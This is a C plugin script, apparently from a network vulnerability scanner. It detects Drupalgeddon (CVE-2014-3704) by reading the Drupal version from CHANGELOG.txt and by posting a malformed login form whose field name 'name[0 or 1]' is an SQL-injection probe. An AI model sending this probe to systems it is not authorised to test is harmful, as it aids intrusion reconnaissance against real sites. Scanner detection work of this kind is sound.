/* http-vuln-cve2014-3704 - Drupalgeddon SQL-injection/version probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    char ver[64];
    const char *body;
    int major = 0;
    int minor = 0;
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_get(ctx, "/CHANGELOG.txt", resp, sizeof(resp));
    if (n > 0) {
        body = ar_http_body(resp);
        if (sscanf(body, "Drupal %d.%d", &major, &minor) == 2 ||
            sscanf(body, "%*[^D]Drupal %d.%d", &major, &minor) == 2) {
            (void)snprintf(ver, sizeof(ver), "%d.%d", major, minor);
            if (major == 7 && minor < 32) {
                ar_out(ctx, "VULNERABLE: Drupal %s (CVE-2014-3704 Drupalgeddon)",
                       ver);
                return 0;
            }
        }
    }
    n = ar_http_post(ctx, "/?q=node&destination=node",
                     "name[0 or 1]=test&name[1]=test&form_id=user_login&op=Log+in",
                     "application/x-www-form-urlencoded", resp, sizeof(resp));
    if (n > 0) {
        body = ar_http_body(resp);
        if (ar_http_status(resp) == 500 &&
            (strstr(body, "PDOException") != NULL ||
             strstr(body, "DatabaseException") != NULL)) {
            ar_out(ctx, "VULNERABLE: Drupal CVE-2014-3704 SQL injection signature");
            return 0;
        }
        if (strstr(body, "Drupal") != NULL) {
            ar_out(ctx, "Drupal detected; CVE-2014-3704 not confirmed");
            return 0;
        }
    }
    ar_out(ctx, "not vulnerable: Drupal CVE-2014-3704 not confirmed");
    return 0;
}
